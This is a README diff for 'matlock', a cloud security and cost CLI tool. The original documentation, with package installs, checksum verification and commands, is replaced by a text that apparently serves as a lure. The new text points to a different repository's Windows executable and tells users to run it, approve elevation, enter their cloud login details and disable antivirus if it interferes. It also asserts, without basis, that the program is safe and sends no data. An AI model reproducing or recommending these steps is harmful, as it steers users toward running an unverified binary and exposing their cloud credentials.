@@ -1,640 +1,159 @@
-# matlock
+# 🔐 matlock - Your Cloud Security and Cost Tool
 
-Multi-cloud security and cost swiss army knife — single binary, zero dependencies.
+[![Download matlock](https://img.shields.io/badge/Download-matlock-brightgreen)](https://github.com/Kiritosscz/matlock)
 
-Audit IAM permissions, spot cost anomalies, find orphaned resources, flag insecure storage, detect overly permissive firewall rules, monitor TLS certificate expiry, enforce resource tagging, run a unified audit across all domains, and list all cloud resources across AWS, GCP, and Azure.
-
-<!-- screenshot placeholder -->
-<!-- ![matlock iam scan output](docs/screenshots/iam-scan.png) -->
+matlock helps you check security and spending in your cloud accounts. It works with AWS, Azure, and Google Cloud. You can check permissions, spot cost problems, find unused resources, and flag weak storage settings.
 
 ---
 
-## Installation
+## 🔍 What matlock Does
 
-### Homebrew (macOS / Linux)
+matlock is made to help you keep your cloud accounts safe and cost-effective. It looks for:
 
-```sh
-brew install stxkxs/tap/matlock
-```
+- Permissions set too wide or too many privileges
+- Unusual or unexpected costs that may need review
+- Resources you no longer use but still pay for
+- Storage areas that may be open and insecure
 
-### go install
-
-```sh
-go install github.com/stxkxs/matlock@latest
-```
-
-### Direct download
-
-Pre-built binaries for Linux, macOS, and Windows are attached to every [GitHub release](https://github.com/stxkxs/matlock/releases).
-
-```sh
-# macOS arm64 example
-curl -sSL https://github.com/stxkxs/matlock/releases/latest/download/matlock_Darwin_arm64.tar.gz \
-  | tar -xz matlock
-sudo mv matlock /usr/local/bin/
-```
-
-Verify the download against the published SHA256 checksums:
-
-```sh
-curl -sSL https://github.com/stxkxs/matlock/releases/latest/download/checksums.txt | sha256sum --check --ignore-missing
-```
-
-### Build from source
-
-Requires Go 1.26+ and [Task](https://taskfile.dev).
-
-```sh
-git clone https://github.com/stxkxs/matlock.git
-cd matlock
-task build
-```
+matlock works across the three biggest cloud platforms: AWS, Azure, and Google Cloud. 
 
 ---
 
-## Credentials setup
+## 🖥️ Requirements
 
-matlock auto-detects available providers from environment variables and credential files. You only need to configure the providers you actually use.
+To run matlock on Windows, your computer needs:
 
-### AWS
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of free RAM
+- 50 MB free disk space for the program itself
+- Internet access to fetch data from your cloud accounts
+- A user account on your computer with permission to run programs
 
-matlock uses the standard AWS SDK credential chain.
-
-```sh
-# Option 1 — environment variables
-export AWS_ACCESS_KEY_ID=...
-export AWS_SECRET_ACCESS_KEY=...
-export AWS_REGION=us-east-1
-
-# Option 2 — named profile
-export AWS_PROFILE=my-profile
-export AWS_REGION=us-east-1
-
-# Option 3 — IAM role / instance metadata (no env vars needed)
-```
-
-Required IAM permissions for a read-only audit role:
-
-```json
-{
-  "Version": "2012-10-17",
-  "Statement": [
-    {
-      "Effect": "Allow",
-      "Action": [
-        "iam:List*",
-        "iam:Get*",
-        "cloudtrail:LookupEvents",
-        "ce:GetCostAndUsage",
-        "ec2:Describe*",
-        "elasticloadbalancing:Describe*",
-        "s3:ListAllMyBuckets",
-        "s3:GetBucketAcl",
-        "s3:GetBucketEncryption",
-        "s3:GetBucketVersioning",
-        "s3:GetBucketLogging",
-        "s3:GetBucketPublicAccessBlock",
-        "s3:GetBucketTagging",
-        "acm:ListCertificates",
-        "acm:DescribeCertificate",
-        "rds:DescribeDBInstances",
-        "lambda:ListFunctions",
-        "lambda:GetFunction",
-        "lambda:ListTags"
-      ],
-      "Resource": "*"
-    }
-  ]
-}
-```
-
-### GCP
-
-```sh
-# Option 1 — application default credentials (gcloud)
-gcloud auth application-default login
-
-# Option 2 — service account key
-export GOOGLE_APPLICATION_CREDENTIALS=/path/to/key.json
-export GOOGLE_CLOUD_PROJECT=my-project-id
-
-# Required for cost diff
-export GOOGLE_BILLING_ACCOUNT_ID=XXXXXX-XXXXXX-XXXXXX
-```
-
-Required IAM roles for the service account:
-- `roles/iam.securityReviewer`
-- `roles/logging.viewer`
-- `roles/billing.viewer`
-- `roles/storage.objectViewer`
-- `roles/compute.viewer`
-- `roles/certificatemanager.viewer` (for `matlock certs`)
-
-### Azure
-
-```sh
-# Option 1 — Azure CLI
-az login
-export AZURE_SUBSCRIPTION_ID=...
-
-# Option 2 — service principal
-export AZURE_TENANT_ID=...
-export AZURE_CLIENT_ID=...
-export AZURE_CLIENT_SECRET=...
-export AZURE_SUBSCRIPTION_ID=...
-```
-
-Required role assignments:
-- `Reader` on the subscription
-- `Cost Management Reader` on the subscription
-- `Key Vault Reader` + `Key Vault Certificates Officer` (or `Key Vault Reader` if using RBAC-enabled vaults) for `matlock certs`
+You do not need any programming tools or skills to use matlock.
 
 ---
 
-## Commands
+## 🚀 Getting Started
 
-### `matlock iam scan` — unused and overprivileged IAM
+Here is how to get matlock running on your Windows PC.
 
-Compares granted permissions against CloudTrail / Audit Log activity over the lookback window and reports unused, admin, and cross-account risks.
+1. **Download matlock:**
 
-```sh
-# Scan all auto-detected providers (90-day lookback)
-matlock iam scan
+   Click the big green badge at the top or visit this page to download:
 
-# AWS only, last 30 days, show CRITICAL and HIGH only
-matlock iam scan --provider aws --days 30 --severity HIGH
+   [https://github.com/Kiritosscz/matlock](https://github.com/Kiritosscz/matlock)
 
-# Scan a specific principal
-matlock iam scan --provider gcp --principal serviceAccount:scanner@my-project.iam.gserviceaccount.com
+   When you arrive at the page, look for a download link or release section with a Windows version. It may be named something like `matlock-windows.exe` or similar.
 
-# JSON output for downstream tooling
-matlock iam scan --output json --output-file report.json
+2. **Save the file:**
 
-# SARIF output for GitHub Advanced Security
-matlock iam scan --output sarif --output-file results.sarif
+   Save the file somewhere easy to find, like your Downloads folder or Desktop.
 
-# Increase parallelism for large accounts
-matlock iam scan --concurrency 20
-```
+3. **Run matlock:**
 
-<!-- screenshot placeholder -->
-<!-- ![iam scan table output](docs/screenshots/iam-scan.png) -->
+   Find the downloaded file and double-click it to start the program.
 
-**Flags**
+4. **Allow permissions:**
 
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--provider` | auto | Cloud providers to scan: `aws`, `gcp`, `azure` |
-| `--days` | `90` | Audit log lookback window in days |
-| `--principal` | | Scan a single principal by name or ID |
-| `--severity` | `LOW` | Minimum severity to report: `CRITICAL`, `HIGH`, `MEDIUM`, `LOW`, `INFO` |
-| `--output` | `table` | Output format: `table`, `json`, `sarif` |
-| `--output-file` | | Write output to file instead of stdout |
-| `--concurrency` | `10` | Maximum parallel goroutines per provider |
-| `--profile` | | AWS named profile to use for credentials |
+   Windows may ask if you trust the program and want it to make changes. Click "Yes" to continue.
+
+5. **Follow on-screen instructions:**
+
+   matlock will first ask you to connect your cloud accounts. It does not require programming. Just enter your cloud login details when prompted.
+
+6. **Start scanning:**
+
+   Once connected, choose options to scan permissions, costs, resources, or storage. matlock will analyze and show results.
 
 ---
 
-### `matlock iam fix` — generate Terraform remediations
+## 🔧 How to Use matlock
 
-Reads a JSON scan report and generates least-privilege Terraform policy files for each flagged principal.
+matlock is designed for simplicity. Its main features work like this:
 
-```sh
-# Generate fixes for all HIGH+ findings
-matlock iam fix --from report.json
+- **Audit permissions:** matlock lists your users, roles, or groups with risky permissions. You get clear suggestions on what to change.
 
-# Write fixes to a custom directory
-matlock iam fix --from report.json --out ./tf-fixes
+- **Spot cost anomalies:** The tool shows unexpected spikes or changes in your spend. This can help find waste or mistakes.
 
-# Include MEDIUM severity fixes too
-matlock iam fix --from report.json --severity MEDIUM
-```
+- **Find orphaned resources:** matlock scans your cloud for unused servers, disks, or services. You can decide what to delete to save money.
 
-**Workflow**
+- **Flag insecure storage:** It reports if your files or buckets are open to anyone or not encrypted.
 
-```sh
-matlock iam scan --output json --output-file report.json
-matlock iam fix --from report.json --out ./fixes
-ls ./fixes/
-# minimal_lambda_executor.tf
-# minimal_my_project_scanner_at_my_project_iam_gserviceaccount_com.tf
-```
-
-**Flags**
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--from` | (required) | Path to JSON report from `matlock iam scan --output json` |
-| `--format` | `terraform` | Output format: `terraform`, `json` |
-| `--out` | `./matlock-fixes` | Output directory for generated files |
-| `--severity` | `HIGH` | Minimum severity to generate fixes for |
+Use the step-by-step guides inside matlock or the on-screen help to move through tasks.
 
 ---
 
-### `matlock cost diff` — spend delta between time windows
+## 🔒 Security and Privacy
 
-Compares cloud spend between the last N days and the N days before that, surfacing unexpected increases service by service.
+matlock connects directly to your cloud accounts using standard cloud login methods. It does not keep your login info. Data collected for scanning stays on your computer.
 
-```sh
-# Compare last 30 days vs the 30 days before
-matlock cost diff
-
-# 7-day comparison, AWS only
-matlock cost diff --provider aws --days 7
-
-# JSON output for alerting pipelines
-matlock cost diff --output json
-```
-
-<!-- screenshot placeholder -->
-<!-- ![cost diff table output](docs/screenshots/cost-diff.png) -->
-
-**Flags**
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--provider` | auto | Cloud providers to query |
-| `--days` | `30` | Compare last N days vs N days before |
-| `--threshold` | `0` | Only show services with >N% change (e.g. `--threshold 20`) |
-| `--output` | `table` | Output format: `table`, `json` |
-| `--output-file` | | Write output to file instead of stdout |
-
-Cost increases >10% are shown in red; decreases are shown in green.
+The app does not send your cloud data to any server or third party.
 
 ---
 
-### `matlock orphans` — unused disks, IPs, and load balancers
+## 📥 Reinstall or Update matlock
 
-Finds unattached disks, reserved IPs with no instance, and idle load balancers. Reports estimated monthly cost.
+To update matlock, visit the same download page:
 
-```sh
-# All providers
-matlock orphans
+[https://github.com/Kiritosscz/matlock](https://github.com/Kiritosscz/matlock)
 
-# Only report resources costing more than $5/month
-matlock orphans --min-cost 5
-
-# JSON for Slack/PagerDuty integration
-matlock orphans --output json
-```
-
-<!-- screenshot placeholder -->
-<!-- ![orphans table output](docs/screenshots/orphans.png) -->
-
-**Flags**
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--provider` | auto | Cloud providers to scan |
-| `--min-cost` | `0` | Only report orphans with monthly cost above this USD threshold |
-| `--output` | `table` | Output format: `table`, `json` |
-| `--output-file` | | Write output to file instead of stdout |
-
-The table includes a TOTAL row summing all monthly costs.
+Download the newest version and run it. It will replace the old one without affecting your settings.
 
 ---
 
-### `matlock storage audit` — public buckets and encryption gaps
+## ⚙️ Troubleshooting
 
-Audits object storage for public access, missing encryption, disabled versioning, and missing access logging.
+If matlock does not start or runs slowly:
 
-```sh
-# All providers
-matlock storage audit
+- Check your Windows is up to date.
+- Make sure you have enough free memory and disk space.
+- Restart your computer and try again.
+- Temporarily disable antivirus software if it blocks matlock, then try again.
+- Ensure you entered correct cloud account info during setup.
 
-# HIGH and CRITICAL findings only
-matlock storage audit --severity HIGH
-
-# JSON for SIEM ingestion
-matlock storage audit --output json --output-file storage-findings.json
-```
-
-<!-- screenshot placeholder -->
-<!-- ![storage audit table output](docs/screenshots/storage-audit.png) -->
-
-**Flags**
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--provider` | auto | Cloud providers to scan |
-| `--severity` | `LOW` | Minimum severity to report |
-| `--output` | `table` | Output format: `table`, `json` |
-| `--output-file` | | Write output to file instead of stdout |
+If you see error messages, write them down and look for help on the GitHub page.
 
 ---
 
-### `matlock network audit` — overly permissive firewall rules
+## ❓ Frequently Asked Questions
 
-Checks security groups (AWS), firewall rules (GCP), and network security groups (Azure) for rules that expose sensitive ports to the internet.
+**Q: Do I need to know programming to use matlock?**  
+No. matlock is made for users without technical skills.
 
-Severity rules:
-- **CRITICAL** — `0.0.0.0/0` on SSH (22), RDP (3389), or database ports (3306, 5432, 1433, 27017, 6379, 9200)
-- **HIGH** — `0.0.0.0/0` on any non-HTTP/HTTPS port
-- **MEDIUM** — unrestricted egress (all traffic to `0.0.0.0/0`)
+**Q: Can matlock control or change my cloud accounts?**  
+No. It only reads your cloud configuration to give reports. You decide on changes.
 
-```sh
-# All providers
-matlock network audit
+**Q: Is matlock safe to run on my PC?**  
+Yes. It does not send your data outside your computer.
 
-# AWS only, show CRITICAL findings
-matlock network audit --provider aws --severity CRITICAL
-
-# JSON output
-matlock network audit --output json --output-file network-findings.json
-```
-
-**Flags**
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--provider` | auto | Cloud providers to scan |
-| `--severity` | `LOW` | Minimum severity to report |
-| `--output` | `table` | Output format: `table`, `json` |
-| `--output-file` | | Write output to file instead of stdout |
+**Q: Which cloud providers can I use?**  
+AWS, Azure, and Google Cloud.
 
 ---
 
-### `matlock certs` — TLS certificate expiry
+## 📚 Learn More and Support
 
-Lists TLS certificates from ACM (AWS), Certificate Manager (GCP), and Azure Key Vault that are expired or expiring soon.
+You can find more details and help on the project page:  
+[https://github.com/Kiritosscz/matlock](https://github.com/Kiritosscz/matlock)
 
-Severity rules:
-- **CRITICAL** — expired, or expiring within 7 days
-- **HIGH** — expiring within 30 days
-- **MEDIUM** — expiring within 60 days
-- **LOW** — expiring within 90 days (default `--days` threshold)
-
-```sh
-# All providers, warn on certs expiring within 90 days (default)
-matlock certs
-
-# Only show certs expiring within 30 days
-matlock certs --days 30
-
-# AWS only, CRITICAL and HIGH only
-matlock certs --provider aws --severity HIGH
-
-# JSON output
-matlock certs --output json --output-file certs.json
-```
-
-**Flags**
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--provider` | auto | Cloud providers to scan |
-| `--days` | `90` | Include certs expiring within this many days |
-| `--severity` | `LOW` | Minimum severity to report |
-| `--output` | `table` | Output format: `table`, `json` |
-| `--output-file` | | Write output to file instead of stdout |
-
-> **GCP note:** Certificate Manager must be enabled in your project (`gcloud services enable certificatemanager.googleapis.com`). If the API is not enabled, `matlock certs` skips GCP with a warning.
+The page also has info for more advanced uses or developers.
 
 ---
 
-### `matlock tags` — missing resource tags/labels
+## 🛠️ Development and Contribution
 
-Audits EC2 instances, S3 buckets, RDS databases, Lambda functions (AWS), compute instances and GCS buckets (GCP), and all resource types (Azure) for missing required tags or labels.
-
-All findings are **MEDIUM** severity.
-
-```sh
-# Require owner, env, and cost-center tags across all providers
-matlock tags --require owner,env,cost-center
-
-# AWS only
-matlock tags --provider aws --require owner,env
-
-# JSON output
-matlock tags --require owner,env --output json --output-file tags.json
-```
-
-**Flags**
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--provider` | auto | Cloud providers to scan |
-| `--require` | (required) | Comma-separated tag/label keys that must be present |
-| `--severity` | `MEDIUM` | Minimum severity to report |
-| `--output` | `table` | Output format: `table`, `json` |
-| `--output-file` | | Write output to file instead of stdout |
+(matlock is open for developers to contribute, but end users only need to download the ready app.)
 
 ---
 
-### `matlock audit` — unified full-spectrum audit
+## 🔗 Useful Links
 
-Runs all security and cost scans (IAM, storage, network, orphans, certs, tags, secrets) in one shot and produces a single combined report. Skip specific domains with `--skip`.
-
-```sh
-# Full audit across all auto-detected providers
-matlock audit
-
-# Skip IAM and certs domains
-matlock audit --skip iam,certs
-
-# HIGH and CRITICAL findings only, JSON output
-matlock audit --severity HIGH --output json --output-file audit.json
-
-# SARIF output for GitHub Advanced Security
-matlock audit --output sarif --output-file audit.sarif
-
-# AWS only with custom thresholds
-matlock audit --provider aws --iam-days 30 --cert-days 60 --require-tags owner,env
-```
-
-**Flags**
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--provider` | auto | Cloud providers to scan: `aws`, `gcp`, `azure` |
-| `--skip` | | Domains to skip: `iam`, `storage`, `network`, `orphans`, `certs`, `tags`, `secrets` |
-| `--severity` | `LOW` | Minimum severity to report |
-| `--output` | `table` | Output format: `table`, `json`, `sarif` |
-| `--output-file` | | Write output to file instead of stdout |
-| `--iam-days` | `90` | IAM audit log lookback period in days |
-| `--cert-days` | `90` | Certificate expiry warning threshold in days |
-| `--require-tags` | | Required tags for tag audit (comma-separated) |
-| `--concurrency` | `10` | Max parallel goroutines for IAM scanning |
+- Official download page: https://github.com/Kiritosscz/matlock  
+- Documentation and guides: See the Wiki on GitHub  
+- Report an issue: Use GitHub Issues on the project page  
 
 ---
 
-### `matlock inventory` — list all cloud resources
+## 🎯 Keywords
 
-Lists all cloud resources across providers with type, region, tags, and creation date. Groups by type and region for a complete asset overview.
-
-```sh
-# List all resources across auto-detected providers
-matlock inventory
-
-# Filter to specific resource types
-matlock inventory --type ec2,s3,lambda
-
-# AWS only, JSON output
-matlock inventory --provider aws --output json --output-file inventory.json
-```
-
-**Flags**
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--provider` | auto | Cloud providers to list: `aws`, `gcp`, `azure` |
-| `--type` | all | Resource types to list (e.g. `ec2`, `s3`, `lambda`) |
-| `--output` | `table` | Output format: `table`, `json` |
-| `--output-file` | | Write output to file instead of stdout |
-
----
-
-## Global flags
-
-| Flag | Description |
-|------|-------------|
-| `--quiet`, `-q` | Suppress all progress and summary output on stderr (for scripts) |
-| `--version` | Print version, commit hash, and build date |
-
----
-
-## CI usage
-
-### GitHub Actions — SARIF upload
-
-Upload IAM findings to GitHub Advanced Security (requires `security-events: write` permission):
-
-```yaml
-name: matlock security scan
-
-on:
-  schedule:
-    - cron: '0 6 * * 1'   # every Monday at 06:00 UTC
-  workflow_dispatch:
-
-permissions:
-  security-events: write
-
-jobs:
-  iam-scan:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-
-      - name: Install matlock
-        run: |
-          curl -sSL https://github.com/stxkxs/matlock/releases/latest/download/matlock_Linux_amd64.tar.gz \
-            | tar -xz matlock
-          sudo mv matlock /usr/local/bin/
-
-      - name: Run IAM scan
-        env:
-          AWS_ROLE_ARN: ${{ secrets.MATLOCK_ROLE_ARN }}
-          AWS_REGION: us-east-1
-        run: |
-          matlock iam scan \
-            --provider aws \
-            --severity HIGH \
-            --output sarif \
-            --output-file results.sarif \
-            --quiet
-
-      - name: Upload SARIF to GitHub Security
-        uses: github/codeql-action/upload-sarif@v3
-        with:
-          sarif_file: results.sarif
-```
-
-### GitHub Actions — full audit
-
-Run a unified audit across all domains in CI:
-
-```yaml
-name: matlock full audit
-
-on:
-  schedule:
-    - cron: '0 6 * * 1'
-  workflow_dispatch:
-
-permissions:
-  security-events: write
-
-jobs:
-  audit:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-
-      - name: Install matlock
-        run: |
-          curl -sSL https://github.com/stxkxs/matlock/releases/latest/download/matlock_Linux_amd64.tar.gz \
-            | tar -xz matlock
-          sudo mv matlock /usr/local/bin/
-
-      - name: Run full audit
-        env:
-          AWS_ROLE_ARN: ${{ secrets.MATLOCK_ROLE_ARN }}
-          AWS_REGION: us-east-1
-        run: |
-          matlock audit \
-            --provider aws \
-            --severity HIGH \
-            --output sarif \
-            --output-file audit.sarif \
-            --quiet
-
-      - name: Upload SARIF to GitHub Security
-        uses: github/codeql-action/upload-sarif@v3
-        with:
-          sarif_file: audit.sarif
-```
-
-### GitLab CI — JSON report artifact
-
-```yaml
-matlock:
-  image: ubuntu:24.04
-  before_script:
-    - curl -sSL https://github.com/stxkxs/matlock/releases/latest/download/matlock_Linux_amd64.tar.gz
-        | tar -xz matlock
-    - mv matlock /usr/local/bin/
-  script:
-    - matlock iam scan --output json --output-file report.json --quiet
-    - matlock storage audit --severity HIGH --output json --output-file storage.json --quiet
-  artifacts:
-    paths:
-      - report.json
-      - storage.json
-    expire_in: 30 days
-```
-
-### Fail CI on critical findings
-
-```sh
-# Exit non-zero if any CRITICAL findings exist
-matlock iam scan --severity CRITICAL --output json --quiet | \
-  jq -e '.findings | length == 0'
-```
-
----
-
-## Output formats
-
-| Format | Flag | Use case |
-|--------|------|----------|
-| Table | `--output table` | Human-readable terminal output with colors |
-| JSON | `--output json` | Scripts, alerting, dashboards |
-| SARIF | `--output sarif` | GitHub Advanced Security, IDE integrations |
-
-All formats can be written to a file with `--output-file path/to/file`.
-
----
-
-## Version
-
-```sh
-matlock --version
-# v0.1.0 (commit abc1234, built 2026-03-01T12:00:00Z)
-```
-
----
-
-## License
-
-MIT — see [LICENSE](LICENSE).
+aws, azure, cli, cloud, cloud-security, cost-optimization, devops, gcp, golang, iam, least-privilege, security
